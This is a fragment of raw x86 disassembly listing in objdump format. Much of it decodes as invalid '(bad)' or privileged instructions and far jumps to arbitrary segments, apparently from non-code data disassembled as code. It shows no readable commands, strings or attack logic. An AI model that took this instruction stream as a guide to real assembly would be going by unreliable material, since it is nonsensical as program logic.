  429a0e:	add    edx,edx
  429a10:	adc    DWORD PTR [edx-0xc],0xffffffea
  429a14:	in     al,dx
  429a15:	jns    0x429a70
  429a17:	aam    0xd2
  429a19:	fisubr WORD PTR [ebp+0x28]
  429a1c:	or     al,0xff
  429a1e:	jb     0x429a02
  429a20:	push   ebp
  429a21:	mov    ecx,0x968650c4
  429a26:	mov    ds:0x1e6224d1,al
  429a2b:	jnp    0x4299c2
  429a2d:	test   esi,edx
  429a2f:	adc    dh,cl
  429a31:	push   ebx
  429a32:	mov    ss,WORD PTR [eax-0x41]
  429a35:	and    esi,eax
  429a37:	(bad)  [edi]
  429a39:	push   ebp
  429a3a:	fisttp QWORD PTR [edi+esi*1]
  429a3d:	call   0x4d42:0x5cb74963
  429a44:	pop    edx
  429a45:	daa    
  429a46:	shl    DWORD PTR [edi+0x35],0xf7
  429a4a:	adc    edi,DWORD PTR [edx+0x1e069f4f]
  429a50:	gs test al,0xba
  429a53:	jns    0x429a0b
  429a55:	dec    esp
  429a56:	(bad)  [ebp-0x6218b05a]
  429a5c:	dec    ebx
  429a5d:	ss cs xchg esp,eax
  429a60:	mov    edx,0x3466bccc
  429a65:	xchg   ebx,eax
  429a66:	ret    0x7249
  429a69:	mov    edx,0x7ed7b0a2
  429a6e:	push   edx
  429a6f:	xor    DWORD PTR ds:0xf1de3f80,edi
  429a75:	scas   eax,DWORD PTR es:[edi]
  429a76:	pusha  
  429a77:	shl    DWORD PTR [edi-0x1d],cl
  429a7a:	sub    DWORD PTR [ecx+0x11c8ad49],0xffffff87
  429a81:	test   ecx,ebx
  429a83:	add    bh,BYTE PTR [ebx]
  429a85:	xor    eax,0x4974bafd
  429a8a:	sbb    edx,DWORD PTR [esi]
  429a8c:	bnd jle 0x429a36
  429a8f:	jnp    0x429a83
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x62a95667
  429b01:	(bad)  
  429b02:	jb     0x429b3f
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	cld    
  429b0d:	cmp    ebx,ebp
  429b0f:	pop    ds
  429b10:	sub    DWORD PTR [eax-0x1628be31],edi
  429b16:	pop    ebx
  429b17:	inc    ecx
  429b18:	xchg   DWORD PTR ds:0x114ee87b,esi
  429b1e:	(bad)  
  429b1f:	adc    ecx,ecx
  429b21:	fimul  WORD PTR [ebp+0x77]
  429b24:	cli    
  429b25:	mov    al,0xf6
  429b27:	cmp    ch,BYTE PTR [ecx]
  429b29:	(bad)  
  429b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b2b:	mov    es,WORD PTR [ecx+eiz*2+0x79]
  429b2f:	imul   eax,DWORD PTR [ecx],0x1b
  429b32:	mov    ds:0xbc31397f,eax
  429b37:	imul   esi,ebx,0xf
  429b3a:	sahf   
  429b3b:	xor    cl,bl
  429b3d:	cmp    al,0x3
  429b3f:	and    ebx,DWORD PTR [ebx+0x0]
  429b42:	jae    0x429b14
  429b44:	push   ss
  429b45:	imul   esi,DWORD PTR [eax+ebx*2+0x2e],0xffffff8d
  429b4a:	invlpg BYTE PTR [ebp+0x15fd6589]
  429b51:	and    eax,0x32934065
  429b56:	cmp    ah,BYTE PTR [edi-0xc993510]
  429b5c:	lock push es
  429b5e:	dec    eax
  429b5f:	pop    ecx
  429b60:	adc    ch,bh
  429b62:	sbb    DWORD PTR [edx+0x380a5a56],edi
  429b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b69:	ficomp DWORD PTR [eax-0x48eb6a61]
  429b6f:	xchg   esp,eax
  429b70:	sub    DWORD PTR ds:0x147fd5d,ebp
  429b76:	or     eax,DWORD PTR [edi-0x1f]
  429b79:	add    BYTE PTR [ebp-0x75832bbe],ch
  429b7f:	sbb    al,0xd
  429b81:	cmp    al,0x97
  429b83:	push   0x40f6a6b0
  429b88:	fs stos DWORD PTR es:[edi],eax
  429b8a:	push   0x5a5079d7
  429b8f:	outs   dx,BYTE PTR ds:[esi]
  429b90:	jno    0x429c00
  429b92:	jge    0x429b4b
  429b94:	jmp    0xa3ea:0x9b2bc294
  429b9b:	adc    BYTE PTR [ebp-0x31],bh
  429b9e:	clc    
  429b9f:	ins    DWORD PTR es:[edi],dx
  429ba0:	sahf   
  429ba1:	lea    edx,[ebx+0x21]
  429ba4:	loope  0x429c02
  429ba6:	mov    al,0x54
  429ba8:	jecxz  0x429b33
  429baa:	scas   al,BYTE PTR es:[edi]
  429bab:	fdivr  st(0),st
  429bad:	jns    0x429bf3
  429baf:	shl    BYTE PTR [ecx*1-0x15a713c8],cl
  429bb6:	fbstp  TBYTE PTR [ebx]
  429bb8:	add    eax,0x6f2a7f19
  429bbd:	xlat   BYTE PTR ds:[ebx]
  429bbe:	scas   eax,DWORD PTR es:[edi]
  429bbf:	sahf   
  429bc0:	es dec esp
  429bc2:	hlt    
  429bc3:	out    0x6d,eax
  429bc5:	pop    ecx
  429bc6:	mov    DWORD PTR [edx-0x26],edx
  429bc9:	shl    BYTE PTR [edi-0x26],1
  429bcc:	repnz gs xchg esi,eax
  429bcf:	aam    0xc0
  429bd1:	sar    bh,1
  429bd3:	lds    edx,FWORD PTR [eax+0x789bbfd0]
  429bd9:	fs ins BYTE PTR es:[edi],dx
  429bdb:	aam    0x7d
  429bdd:	pop    ebx
  429bde:	push   0xffffffab
  429be0:	cmp    esi,DWORD PTR [ebx-0x586fc3b5]
  429be6:	cs mov edx,0x541250ec
  429bec:	fsubr  QWORD PTR [edx+0xd]
  429bef:	js     0x429c4c
  429bf1:	je     0x429bca
  429bf3:	mov    ebx,0x3757ee1d
  429bf8:	dec    ecx
  429bf9:	ss jge 0x429b94
  429bfc:	in     al,dx
  429bfd:	jae    0x429be5
  429bff:	ficomp DWORD PTR ds:0xe57c711a
  429c05:	mov    WORD PTR [edx],cs
  429c07:	bnd jb 0x429bef
  429c0a:	push   edi
  429c0b:	mov    cl,0x23
  429c0d:	gs pop es
  429c0f:	aam    0x11
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [eax+0x696a9a9c],al
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	js     0x429c99
  429c8e:	xchg   edi,eax
  429c8f:	inc    ebx
  429c90:	mov    ecx,DWORD PTR [edi+ebx*8-0x2d8129f]
  429c97:	call   0x53aa:0xd41a708a
  429c9e:	xor    ecx,DWORD PTR [ebx+0x6017379b]
  429ca4:	xchg   ecx,eax
  429ca5:	shl    esi,1
  429ca7:	jmp    DWORD PTR [eax]
  429ca9:	and    eax,DWORD PTR [esi-0x5c383dc8]
  429caf:	pusha  
  429cb0:	popa   
  429cb1:	jmp    0x429c9d
  429cb3:	or     DWORD PTR [esi+0x4a],0x98525ee3
  429cba:	cli    
  429cbb:	and    dh,dl
  429cbd:	cmp    BYTE PTR [esi-0x71],ah
  429cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cc1:	cli    
  429cc2:	inc    edx
  429cc3:	pop    ebp
  429cc4:	sbb    eax,0xf28b912d
  429cc9:	test   DWORD PTR [ebp+0x3c],esi
  429ccc:	sub    edi,ecx
  429cce:	fsubrp st(0),st
  429cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429cd1:	pop    edi
  429cd2:	add    esp,ebp
  429cd4:	mov    gs,WORD PTR [eax+eiz*8+0x4c1a54fc]
  429cdb:	das    
  429cdc:	ins    BYTE PTR es:[edi],dx
  429cdd:	sub    DWORD PTR [edx-0x3d],edi
  429ce0:	or     eax,0x5369063d
  429ce5:	ins    DWORD PTR es:[edi],dx
  429ce6:	and    eax,0xa050ae8d
  429ceb:	mov    ds:0xabe4d267,eax
  429cf0:	mov    bh,0xff
  429cf2:	fiadd  WORD PTR [edx]
  429cf4:	(bad)  
  429cf6:	mov    eax,ds:0xccde35c8
  429cfb:	jmp    0xc21a:0x46a5ee60
  429d02:	cmp    BYTE PTR [eax-0x25],cl
  429d05:	xor    al,0xe5
  429d07:	ins    BYTE PTR es:[edi],dx
  429d08:	pop    es
  429d09:	or     ebx,0x4
  429d0c:	xchg   ah,al
  429d0e:	jle    0x429ced
  429d10:	loopne 0x429d45
  429d12:	or     eax,0x98321d38
  429d17:	adc    BYTE PTR [ebp-0x7c],dh
  429d1a:	mov    ds:0x258224b8,eax
  429d1f:	jp     0x429d73
  429d21:	fcomp  DWORD PTR [ebp+0x2c]
  429d24:	in     eax,0x7e
  429d26:	push   ebp
  429d27:	mov    esi,0xf4c4595f
  429d2c:	les    ebp,FWORD PTR [ebx+0x53e7a2c1]
  429d32:	cmp    esi,DWORD PTR [eax+esi*8-0x43]
  429d36:	xor    ch,dl
  429d38:	scas   eax,DWORD PTR es:[edi]
  429d39:	push   0x48
  429d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d3c:	dec    ebp
  429d3d:	retf   0x8f00
  429d40:	dec    edx
  429d41:	mov    ds:0xebc4701c,eax
  429d46:	fistp  QWORD PTR [esi-0x29]
  429d49:	push   ss
  429d4a:	fstp   TBYTE PTR [edi+eiz*4-0x453c0bc1]
  429d51:	cli    
  429d52:	fsubp  st(2),st
  429d54:	mov    cs,WORD PTR [edi+0x533e73cc]
  429d5a:	xor    al,BYTE PTR [ecx+0x73]
  429d5d:	dec    ecx
  429d5e:	sbb    BYTE PTR [esp+edx*4+0x18],dl
  429d62:	ins    DWORD PTR es:[edi],dx
  429d63:	les    eax,FWORD PTR [ecx+0x47]
  429d66:	or     ebx,esi
  429d68:	je     0x429d92
  429d6a:	ja     0x429d69
  429d6c:	ret    
  429d6d:	stc    
  429d6e:	or     eax,0x76d5ad4c
  429d73:	jnp    0x429d44
  429d75:	fstp   DWORD PTR [edx]
  429d77:	add    DWORD PTR ds:0x316966ad,0xfffffffe
  429d7e:	scas   al,BYTE PTR es:[edi]
  429d7f:	jge    0x429d9e
  429d81:	clc    
  429d82:	clc    
  429d83:	or     BYTE PTR [ebp*8-0x68dd7ba5],bh
  429d8a:	or     DWORD PTR [eax+0x650d4eb7],0x25
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e01:	jle    0x429e23
  429e03:	loop   0x429e73
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x73000001
  429e0d:	mov    ss,WORD PTR [ecx-0x71]
  429e10:	xchg   esi,eax
  429e11:	jns    0x429dd2
  429e13:	sub    bl,BYTE PTR [esi+0x0]
  429e16:	mov    bh,0x28
  429e18:	icebp  
  429e19:	(bad)  
  429e1a:	jle    0x429e3b
  429e1c:	cmp    ebp,DWORD PTR [ebx+0x51]
  429e1f:	les    ecx,FWORD PTR [eax+ecx*8-0x6b]
  429e23:	sbb    al,0x2e
  429e25:	ds dec ebp
  429e27:	sub    al,cl
  429e29:	cmp    DWORD PTR [esi],0xffffffd2
  429e2c:	ss add al,0x5b
  429e2f:	pop    eax
  429e30:	repnz push esp
  429e32:	bswap  edi
  429e34:	outs   dx,DWORD PTR ds:[esi]
  429e36:	mov    al,ds:0xd698f4eb
  429e3b:	js     0x429ead
  429e3d:	nop
  429e3e:	jbe    0x429e2e
  429e40:	push   eax
  429e41:	sub    DWORD PTR [ebx-0x148fd266],0xb
  429e48:	outs   dx,DWORD PTR ds:[esi]
  429e49:	hlt    
  429e4a:	xor    ebp,DWORD PTR [ebx+eiz*4+0x3e]
  429e4e:	sar    BYTE PTR [eax-0x46],0xfa
  429e52:	mov    bh,0x60
  429e54:	fsub   DWORD PTR [edi+0x5f72c7b1]
  429e5a:	pop    ebx
  429e5b:	xlat   BYTE PTR ds:[ebx]
  429e5c:	cdq    
  429e5d:	jle    0x429ded
  429e5f:	mov    bl,0x33
  429e61:	lods   eax,DWORD PTR ds:[esi]
  429e62:	cwde   
  429e63:	ins    BYTE PTR es:[edi],dx
  429e64:	sbb    cl,ah
  429e66:	cs adc eax,0xf3281fa6
  429e6c:	push   cs
  429e6d:	jae    0x429e20
  429e6f:	pop    ds
  429e70:	nop
  429e71:	add    DWORD PTR [ecx+0x74],esi
  429e74:	mov    ch,0xf
  429e76:	sbb    al,0x45
  429e78:	outs   dx,BYTE PTR ds:[esi]
  429e79:	cdq    
  429e7a:	imul   eax,DWORD PTR [edi],0xffffffa6
  429e7d:	xchg   ecx,eax
  429e7e:	mov    al,ds:0x2c6410d4
  429e83:	ror    esp,1
  429e85:	dec    edi
  429e86:	cmp    eax,0x45e6b5e
  429e8b:	cmp    al,0x33
  429e8d:	jns    0x429ed6
  429e8f:	packsswb mm5,QWORD PTR [ebp-0x25]
  429e93:	or     bl,ch
  429e95:	inc    ecx
  429e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e97:	add    eax,0x35bb63f7
  429e9c:	mov    eax,ds:0x323cce24
  429ea1:	pop    ecx
  429ea2:	clc    
  429ea3:	das    
  429ea4:	pop    ebx
  429ea5:	fwait
  429ea6:	cmc    
  429ea7:	div    DWORD PTR [edi+0x5c5ece63]
  429ead:	sbb    al,0xc5
  429eaf:	pop    ecx
  429eb0:	bound  ebx,QWORD PTR [eax+ecx*8+0xd9b42db]
  429eb7:	lock xchg ebp,eax
  429eb9:	inc    ebx
  429eba:	mov    ds:0x9daff77f,eax
  429ebf:	jecxz  0x429f16
  429ec1:	mov    al,0xd8
  429ec3:	cld    
  429ec4:	xlat   BYTE PTR ds:[ebx]
  429ec5:	and    bh,ah
  429ec7:	imul   eax,DWORD PTR [eax+0x1f63bcc],0xa116e6a5
  429ed1:	jo     0x429e62
  429ed3:	add    al,0x5e
  429ed5:	sahf   
  429ed6:	pop    edi
  429ed7:	dec    edx
  429ed8:	mov    BYTE PTR [ecx+0x74],0xa5
  429edc:	xchg   edi,esp
  429ede:	aam    0x7a
  429ee0:	das    
  429ee1:	xlat   BYTE PTR fs:[ebx]
  429ee3:	aam    0xe4
  429ee5:	enter  0x71fb,0xaf
  429ee9:	push   edi
  429eea:	(bad)  
  429eeb:	xchg   esp,eax
  429eec:	je     0x429e80
  429eee:	inc    esi
  429eef:	pop    ds
  429ef0:	push   ecx
  429ef1:	sbb    esi,ecx
  429ef3:	(bad)  
  429ef4:	imul   ebx,DWORD PTR [esi+eax*1-0x6aa787],0xffffffd2
  429efc:	pop    esi
  429efd:	test   al,0x3e
  429eff:	add    edi,DWORD PTR [eax-0x25]
  429f02:	or     DWORD PTR [edx-0x38],edi
  429f05:	je     0x429f0c
  429f07:	stos   BYTE PTR es:[edi],al
  429f08:	je     0x429ead
  429f0a:	mov    ebx,fs
  429f0c:	or     ebx,DWORD PTR [ebp-0x16]
  429f0f:	adc    dh,0x0
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x39474856]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x97000001
  429f8d:	in     al,0xb1
  429f8f:	and    al,0xa
  429f91:	retf   
  429f92:	adc    eax,0xdf4f772
  429f97:	cmp    BYTE PTR [eax],dl
  429f99:	add    edx,ecx
  429f9b:	inc    ebp
  429f9c:	jb     0x429faf
  429f9e:	jmp    0x8d5b:0x90695f12
  429fa5:	push   cs
  429fa6:	mov    al,0x2a
  429fa8:	fwait
  429fa9:	or     eax,0xec3ceb6e
  429fae:	aad    0xe1
  429fb0:	xchg   ebx,eax
  429fb1:	mov    ss,WORD PTR [esi-0x758e113d]
  429fb7:	ins    BYTE PTR es:[edi],dx
  429fb8:	add    dh,BYTE PTR [eax+0x1ef8d5a0]
  429fbe:	and    bl,BYTE PTR [edi]
  429fc0:	mov    ah,0xad
  429fc2:	je     0x429fd9
  429fc4:	enter  0x654,0x72
  429fc8:	pop    es
  429fc9:	and    dl,ch
  429fcb:	push   ds
  429fcc:	push   es
  429fcd:	es dec edi
  429fcf:	es xor al,0xf6
  429fd2:	ins    DWORD PTR es:[edi],dx
  429fd3:	fild   QWORD PTR [esi+eiz*2-0x659ea17d]
  429fda:	ins    BYTE PTR es:[edi],dx
  429fdb:	mov    ?,WORD PTR [edx]
  429fdd:	dec    ecx
  429fde:	mov    ebp,0xfb0cd0a2
  429fe3:	mov    edx,0x87e1806d
  429fe8:	stc    
  429fe9:	jl     0x42a047
  429feb:	cs daa 
  429fed:	out    dx,al
  429fee:	sahf   
  429fef:	outs   dx,DWORD PTR ds:[esi]
  429ff0:	arpl   bp,di
  429ff2:	test   al,0xfb
  429ff4:	aam    0x97
  429ff6:	ret    0xbd23
  429ff9:	xor    esp,0xffffff88
  429ffc:	ror    BYTE PTR [edx+edi*4],0xc3
  42a000:	jmp    0x53ecfd37
  42a005:	add    cl,0x52
  42a008:	bound  ebx,QWORD PTR [edi]
  42a00a:	xchg   DWORD PTR [edi+0x55],esi
  42a00d:	popa   
  42a00e:	cmp    DWORD PTR [edi],esp
  42a010:	shl    BYTE PTR [eax],0xfc
  42a013:	rcr    DWORD PTR [ecx],0x1f
  42a016:	ror    BYTE PTR ds:0x119ea856,0xda
  42a01d:	jmp    0x1260:0xe8c724f1
  42a024:	jmp    0x42a05c
  42a026:	or     DWORD PTR [esi],esi
  42a028:	stos   DWORD PTR es:[edi],eax
  42a029:	or     BYTE PTR [edi+ebp*8+0x20],dl
  42a02d:	cmp    bh,al
  42a02f:	add    eax,0xd3ad0b33
  42a034:	mov    ah,BYTE PTR [eax+0x45727c34]
  42a03a:	dec    ebp
  42a03b:	push   edi
  42a03c:	xlat   BYTE PTR ds:[ebx]
  42a03d:	inc    ebx
  42a03e:	test   al,0x10
  42a040:	cmp    bl,BYTE PTR [ebp-0x27787b03]
  42a046:	scas   eax,DWORD PTR es:[edi]
  42a047:	stc    
  42a048:	xor    cl,bh
  42a04a:	sub    eax,0xc3603d91
  42a04f:	test   al,0x4d
  42a051:	nop
  42a052:	mov    bh,0x11
  42a054:	bound  dx,DWORD PTR [eax-0x31]
  42a058:	lods   eax,DWORD PTR ds:[esi]
  42a059:	dec    ebp
  42a05a:	xchg   ebx,eax
  42a05b:	loope  0x42a01f
  42a05d:	adc    BYTE PTR [edx+0x7e],bh
  42a060:	mov    al,ds:0x3a263388
  42a065:	int    0x78
  42a067:	mov    al,0x9c
  42a069:	js     0x42a0db
  42a06b:	cmp    ch,BYTE PTR [ebp-0x12]
  42a06e:	cmp    al,0x4f
  42a070:	mov    BYTE PTR [edx],ch
  42a072:	(bad)  
  42a073:	sbb    ebp,ebp
  42a075:	addr16 cs iret 
  42a078:	inc    ebp
  42a079:	xor    DWORD PTR [edi+0x14],edx
  42a07c:	sti    
  42a07d:	cmp    DWORD PTR [ecx],edi
  42a07f:	push   edx
  42a080:	mov    WORD PTR [eax],?
  42a082:	lahf   
  42a083:	outs   dx,DWORD PTR ds:[esi]
  42a084:	imul   edi,DWORD PTR [ebx+0x1c],0xc
  42a088:	add    al,0x94
  42a08a:	outs   dx,DWORD PTR ds:[esi]
  42a08b:	int3   
  42a08c:	into   
  42a08d:	cmp    eax,0xadca98
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	pop    ecx
  42a101:	mov    esi,0xc278a098
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xdb000001
  42a10d:	js     0x42a112
  42a10f:	pusha  
  42a110:	jmp    0x42a0d8
  42a112:	push   ss
  42a113:	mov    WORD PTR [eax-0x5b],ss
  42a116:	stos   BYTE PTR es:[edi],al
  42a117:	(bad)  
  42a118:	mov    ds:0x9e049fa3,al
  42a11d:	xor    DWORD PTR [edi-0x74e60453],esi
  42a123:	dec    edi
  42a124:	fist   DWORD PTR [ecx-0x3cef0ca9]
  42a12a:	jno    0x42a0ae
  42a12c:	mov    ah,0xc5
  42a12e:	sub    eax,DWORD PTR [eax+0x25]
  42a131:	xor    dh,cl
  42a133:	test   BYTE PTR [edi+0x43514e7e],bh
  42a139:	adc    al,0x79
  42a13b:	je     0x42a1a1
  42a13d:	sahf   
  42a13e:	in     al,0xf9
  42a140:	xchg   BYTE PTR [eax+eax*2],ah
  42a143:	or     DWORD PTR [ecx],ebx
  42a145:	out    0xc8,al
  42a147:	clc    
  42a148:	popf   
  42a149:	test   BYTE PTR [ecx+0x6c],ah
  42a14c:	retf   0xc828
  42a14f:	sbb    DWORD PTR [ebp-0x3e],eax
  42a152:	fimul  DWORD PTR [ebx+0x3ce231d1]
  42a158:	and    al,0xfa
  42a15a:	dec    esp
  42a15b:	mov    ebx,0x4259f31
  42a160:	repnz inc ebx
  42a162:	dec    ebx
  42a163:	fnstsw WORD PTR [esi+ebx*1+0x3c250799]
  42a16a:	in     al,0xb
  42a16c:	sub    dh,BYTE PTR [ecx]
  42a16e:	jmp    0x42a135
  42a170:	jp     0x42a17c
  42a172:	pop    esp
  42a173:	mov    cl,0xf9
  42a175:	push   esp
  42a176:	xor    BYTE PTR [ebx-0x4d],dh
  42a179:	xchg   edx,eax
  42a17a:	push   es
  42a17b:	mov    WORD PTR [edi],ds
  42a17d:	add    edx,esp
  42a17f:	(bad)  [eax+ebx*2]
  42a182:	cmp    al,0x2c
  42a184:	and    BYTE PTR [esi],bl
  42a186:	or     bl,BYTE PTR [eax+0x1005df34]
  42a18c:	mov    ah,cl
  42a18e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a18f:	and    DWORD PTR [ecx+0x6d],eax
  42a192:	test   eax,0x90506189
  42a197:	rcr    ch,1
  42a199:	in     al,0x4e
  42a19b:	add    ebx,DWORD PTR [edx]
  42a19d:	add    ch,BYTE PTR [ebx]
  42a19f:	pop    ds
  42a1a0:	mov    ds:0x354cf98d,al
  42a1a5:	pop    es
  42a1a6:	rcr    DWORD PTR [eax-0x5d62c50c],cl
  42a1ac:	jl     0x42a132
  42a1ae:	(bad)  
  42a1b0:	rcr    bl,1
  42a1b2:	mov    esi,0xa9d47e42
  42a1b7:	cmp    ecx,DWORD PTR ds:0x63cec6a8
  42a1bd:	ins    BYTE PTR es:[edi],dx
  42a1be:	push   edx
  42a1bf:	push   ebx
  42a1c0:	mov    ch,0xed
  42a1c2:	jle    0x42a19d
  42a1c4:	push   0x44
  42a1c6:	xchg   BYTE PTR [edi+edx*1+0x3f50444a],al
  42a1cd:	pop    ebp
  42a1ce:	lock cmp eax,DWORD PTR [edi]
  42a1d1:	ror    esi,0x3
  42a1d4:	xlat   BYTE PTR ds:[ebx]
  42a1d5:	pop    edi
  42a1d6:	icebp  
  42a1d7:	or     DWORD PTR [eax],esp
  42a1d9:	in     al,0x91
  42a1db:	sub    edi,DWORD PTR [esp+ebx*4-0x17]
  42a1df:	pop    esi
  42a1e0:	inc    eax
  42a1e1:	stos   DWORD PTR es:[edi],eax
  42a1e2:	push   cs
  42a1e3:	pushf  
  42a1e4:	icebp  
  42a1e5:	cwde   
  42a1e6:	shl    BYTE PTR [eax+0x201bcbf1],cl
  42a1ec:	test   DWORD PTR [eax+0xcaf0ba6],ebx
  42a1f2:	mov    bl,0x73
  42a1f4:	dec    ebp
  42a1f5:	adc    BYTE PTR ds:0xe3a0bab8,0xef
  42a1fc:	popa   
  42a1fd:	cmp    esp,ebx
  42a1ff:	xchg   DWORD PTR [esi-0x5d],edx
  42a202:	stos   BYTE PTR es:[edi],al
  42a203:	fsubp  st(7),st
  42a205:	arpl   si,cx
  42a207:	pop    eax
  42a208:	push   ss
  42a209:	call   0x1b8c933b
  42a20e:	cdq    
  42a20f:	mov    edx,0x93
	...
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fnstenv [edx+0x4e]
  42a282:	mov    eax,ds:0x1c37d13
  42a287:	add    BYTE PTR ds:0x6b000001,al
  42a28d:	cld    
  42a28e:	add    ah,bl
  42a290:	std    
  42a291:	sub    eax,0x53e62b4a
  42a296:	mov    al,ds:0xa50e6d7a
  42a29b:	fucomip st,st(0)
  42a29d:	(bad)  
  42a29e:	mov    ch,0x8b
  42a2a0:	xchg   esp,eax
  42a2a1:	les    eax,FWORD PTR [edi+0x52c46074]
  42a2a7:	sar    cl,1
  42a2a9:	jmp    0x42a2f2
  42a2ab:	out    dx,eax
  42a2ac:	cmp    bl,BYTE PTR [edx+eiz*4]
  42a2af:	repnz inc ecx
  42a2b1:	das    
  42a2b2:	sub    eax,DWORD PTR [ebp-0x46aabdc]
  42a2b8:	push   edx
  42a2b9:	rcl    bl,1
  42a2bb:	sbb    BYTE PTR [ebp-0x34],0x97
  42a2bf:	or     eax,DWORD PTR [ecx+0x5]
  42a2c2:	jbe    0x42a288
  42a2c4:	dec    ecx
  42a2c5:	dec    esp
  42a2c6:	ret    
  42a2c7:	mov    bh,0x25
  42a2c9:	ins    BYTE PTR es:[edi],dx
  42a2ca:	xor    dh,al
  42a2cc:	sub    eax,0xceb90ec7
  42a2d1:	mov    dh,0xba
  42a2d3:	retf   
  42a2d4:	xchg   ebx,eax
  42a2d5:	cmp    edx,DWORD PTR [eax-0x62b50dd2]
  42a2db:	cdq    
  42a2dc:	xchg   ecx,eax
  42a2dd:	inc    ecx
  42a2de:	retf   
  42a2df:	aas    
  42a2e0:	adc    DWORD PTR [eax],ebx
  42a2e2:	aaa    
  42a2e3:	iret   
  42a2e4:	stc    
  42a2e5:	test   al,0x89
  42a2e7:	(bad)  
  42a2e8:	or     eax,0x6b468817
  42a2ed:	inc    eax
  42a2ee:	std    
  42a2ef:	mov    bl,0x58
  42a2f1:	popf   
  42a2f2:	ja     0x42a339
  42a2f4:	call   0xfccb6dbc
  42a2f9:	ret    
  42a2fa:	scas   eax,DWORD PTR es:[edi]
  42a2fb:	push   esi
  42a2fc:	xor    BYTE PTR [edi+edi*4-0x66],al
  42a300:	jecxz  0x42a352
  42a302:	out    0x2f,al
  42a304:	iret   
  42a305:	or     BYTE PTR [ebx+0x61],bh
  42a308:	xchg   ebx,eax
  42a309:	mov    cl,0x9c
  42a30b:	xchg   esi,eax
  42a30c:	sbb    dh,BYTE PTR [edi-0x19]
  42a30f:	push   esp
  42a310:	cmp    eax,0xb7cfacf
  42a315:	inc    ecx
  42a316:	or     eax,0x17109f0d
  42a31b:	jns    0x42a305
  42a31d:	push   ebx
  42a31e:	ret    
  42a31f:	push   esi
  42a320:	sub    eax,0xc8edeab8
  42a325:	shr    DWORD PTR [eax+0xdc29f15],1
  42a32b:	add    dh,BYTE PTR [ecx]
  42a32d:	in     al,0x53
  42a32f:	mov    BYTE PTR fs:[ebx],0x5b
  42a333:	mov    esp,0x8ef9e574
  42a338:	or     al,0x4b
  42a33a:	push   DWORD PTR [edx]
  42a33c:	adc    BYTE PTR [eax],0xa9
  42a33f:	test   al,0x8d
  42a341:	cli    
  42a342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a343:	cmp    eax,0x570d3a7b
  42a348:	pusha  
  42a349:	inc    esi
  42a34a:	jp     0x42a360
  42a34c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a34d:	mov    bl,0xe0
  42a34f:	and    ebp,DWORD PTR ds:0x1575362a
  42a355:	inc    eax
  42a356:	mov    esi,0xc581caff
  42a35b:	mul    DWORD PTR [ebp+0x2fc23fb6]
  42a361:	dec    eax
  42a362:	add    DWORD PTR [ebx-0x402f0f6a],0x51
  42a369:	dec    edi
  42a36a:	fidiv  DWORD PTR ds:0xf96c6437
  42a370:	loope  0x42a331
  42a372:	dec    esi
  42a373:	inc    edx
  42a374:	push   edi
  42a375:	mov    ds:0x58b79046,al
  42a37a:	xchg   ecx,eax
  42a37b:	cmp    al,0xe8
  42a37d:	push   es
  42a37e:	jns    0x42a3cc
  42a380:	mov    al,0x7
  42a383:	aaa    
  42a384:	pop    edi
  42a385:	sub    eax,0xde1cb809
  42a38a:	aaa    
  42a38b:	lods   eax,DWORD PTR ds:[esi]
  42a38c:	lea    ebp,[eax+0xc9b561]
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x107fcd3d
  42a403:	mov    esi,0x1c482
  42a408:	add    eax,0xa0000001
  42a40d:	push   ebp
  42a40e:	les    ebx,FWORD PTR [ebx]
  42a410:	mov    al,0xc6
  42a412:	dec    ecx
  42a413:	sbb    eax,0x33c607bc
  42a418:	repnz add edx,DWORD PTR [bx]
  42a41c:	test   al,0x4f
  42a41e:	sahf   
  42a41f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a421:	xor    ebp,DWORD PTR [ebx]
  42a423:	cmp    ecx,DWORD PTR [esi]
  42a425:	lahf   
  42a426:	(bad)  
